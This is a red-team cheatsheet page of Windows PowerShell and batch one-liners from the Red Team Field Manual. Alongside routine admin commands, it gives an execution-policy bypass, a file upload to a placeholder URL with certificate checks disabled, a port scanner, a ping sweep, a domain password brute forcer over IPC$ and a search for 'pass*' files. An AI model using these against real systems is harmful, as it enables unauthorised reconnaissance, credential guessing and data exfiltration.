---
name: Windows Scripting
category: Cheatsheets & Playbooks
description: PowerShell basics, one-liners, credential handling, file operations and Windows batch script recipes.
tags: [windows, powershell, batch, scripting, RTFM]
---

# Windows Scripting

PowerShell basics, one-liners and batch script recipes from the Red Team Field Manual.

## PowerShell basics

```powershell
Stop-Transcript
Get-Content <FILE_PATH>
Get-Help <COMMAND> -Examples
Get-Command *<STRING>*
Get-Service
Get-WmiObject -Class win32_service
$psVersionTable
powershell -version 2.0
Get-Service | measure-object
get-psdrive
Get-Process | select -expandproperty name
get-help * -parameter credential
get-wmiobject -list *network
[Net.DNS]::GetHostEntry("<IP>")
```

## PowerShell one-liners

```powershell
# Launch script bypassing execution policy
powershell -ep bypass -nop -File <FILE_PATH>

# TCP port scanner
$ports=(<PORT>,<PORT>);$ip="<IP>";foreach ($port in $ports){try{$socket=New-object System.Net.Sockets.TCPClient($ip,$port);}catch{};if ($socket -eq $NULL){echo $ip":"$port" - Closed";}else{echo $ip":"$port" - Open";$socket = $NULL;}}

# Ping host
$ping = New-Object System.Net.NetworkInformation.ping;$ping.Send("<IP>",500)

# Download file
powershell -noprofile -noninteractive -Command 'Invoke-WebRequest -Uri "https://<URL>" -OutFile <FILE_PATH>'

# Upload file via POST
powershell -noprofile -noninteractive -command '[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $server="http://<URL>"; $filepath="<FILE_PATH>"; $http = new-object System.Net.WebClient; $response = $http.UploadFile($server,$filepath);'

# Export OS info to CSV
Get-WmiObject -class win32_operatingsystem | select -property * | export-csv <FILE_PATH>

# List running services
Get-Service | where {$_.status -eq "Running"}

# Active TCP connections
[System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties().GetActiveTcpConnections()

# Map PSDrive to remote share
New-PSDrive -Persist -PSProvider FileSystem -Root \\<IP>\<SHARE> -Name Z

# Find recent files
Get-ChildItem -Path <PATH> -Force -Recurse -Filter *.log -ErrorAction SilentlyContinue | where {$_.LastWriteTime -gt "2012-08-20"}

# Enable PS Remoting
Powershell -Command 'Enable-PSRemoting -Force'

# Send email
Send-MailMessage -to "<EMAIL>" -from "<EMAIL>" -subject "<SUBJECT>" -a "<ATTACHMENT>" -body "<BODY>" -SmtpServer "<IP>" -Port "<PORT>" -Credential "<CRED>" -UseSsl
```

## Batch scripts

```batch
:: Nested ping sweep
for /L %i in (10,1,254) do @ (for /L %x in (10,1,254) do @ ping -n 1 -w 100 10.10.%i.%x 2>nul | find "Reply" && echo 10.10.%i.%x >> live.txt)

:: Loop through lines in a file
for /F "tokens=*" %%A in (<FILE_PATH>) do echo %%A

:: Domain brute forcer
for /F %%N in (users.txt) do for /F %%P in (passwords.txt) do net use \\<IP>\IPC$ /user:<DOMAIN>\%%N %%P 1>NUL 2>&1 && echo %%N:%%P && net use /delete \\<IP>\IPC$ > NUL

:: Search files for 'pass*' with metadata
forfiles /P <PATH> /s /m pass* -c "cmd /c echo @isdir @fdate @ftime @relpath @path @fsize"

:: DNS reverse lookup
for /L %%P in (2,1,254) do (nslookup 10.1.11.%%P | findstr /i /c:"Name" >> dns.txt && echo HOST: 10.1.11.%%P >> dns.txt)
```

> Source: RTFM — Red Team Field Manual v2
